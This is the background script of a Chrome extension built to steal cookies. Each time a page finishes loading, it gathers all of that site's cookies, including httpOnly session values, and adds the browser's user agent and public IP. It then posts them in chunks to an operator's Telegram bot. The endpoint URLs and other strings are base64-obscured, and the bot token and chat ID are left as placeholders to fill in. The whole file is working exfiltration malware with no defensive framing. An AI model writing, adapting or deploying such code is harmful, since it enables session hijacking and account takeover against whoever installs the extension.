// ====================================
// CONFIGURATION
// ====================================

const BOT_TOKEN_B64 = 'YOUR_BOT_TOKEN_HERE_(BASE64)';
const CHAT_ID = 'YOUR_CHAT_ID_HERE';

// ====================================
// HELPER FUNCTIONS
// ====================================

const d = atob;
const e = btoa;

function s(t) {
  return t.replace(/[_*[\]`]/g, '\\$&');
}

function c(m, l = 4000) {
  const r = [];
  for (let i = 0; i < m.length; i += l) {
    r.push('```json\n' + m.substring(i, i + l) + '\n```');
  }
  return r;
}

async function getIPAddr() {
  try {
    const r = await fetch(d('aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u'));
    const j = await r.json();
    return j.ip;
  } catch {
    return 'Unknown';
  }
}

// ====================================
// MAIN LOGIC
// ====================================

chrome.webNavigation.onCompleted.addListener(async (details) => {
  if (details.frameId !== 0) return;

  chrome.cookies.getAll({ url: details.url }, async (cookies) => {
    if (!cookies || cookies.length === 0) {
      console.log('No cookies.');
      return;
    }

    const formatted = cookies.map(ck => ({
      domain: ck.domain,
      expirationDate: ck.expirationDate,
      hostOnly: ck.hostOnly,
      httpOnly: ck.httpOnly,
      name: ck.name,
      path: ck.path,
      sameSite: ck.sameSite,
      secure: ck.secure,
      session: ck.session,
      storeId: ck.storeId ?? null,
      value: ck.value
    }));

    console.log(JSON.stringify(formatted, null, 2));
    await sendData(details.url, JSON.stringify(formatted));
  });
}, {
  url: [{ schemes: ['https', 'http'] }]
});

async function sendData(url, cookiesJson) {
  const token = d(BOT_TOKEN_B64);
  const chunks = c(cookiesJson);
  const ip = await getIPAddr();

  const header = [
    `⛄ *User Agent:* ${s(navigator.userAgent)}`,
    `🎄 *IP:* ${s(ip)}`,
    `❄️ *URL:* ${s(url.replace(/https?:\/\//g, ''))}`
  ];

  chunks[0] = header.join('\n') + '\n\n' + chunks[0];

  const apiUrl = d('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==');
  const endpoint = d('L3NlbmRNZXNzYWdl');

  try {
    for (const chunk of chunks) {
      const response = await fetch(`${apiUrl}${token}${endpoint}`, {
        method: d('UE9TVA=='),
        headers: {
          'Content-Type': d('YXBwbGljYXRpb24vanNvbg==')
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: chunk,
          parse_mode: d('TWFya2Rvd24='),
          disable_web_page_preview: true
        })
      });

      if (!response.ok) {
        console.error('API error:', response.status, await response.text());
      } else {
        console.log('Data sent successfully!');
      }
    }
  } catch (error) {
    console.error('Send failed:', error);
  }
}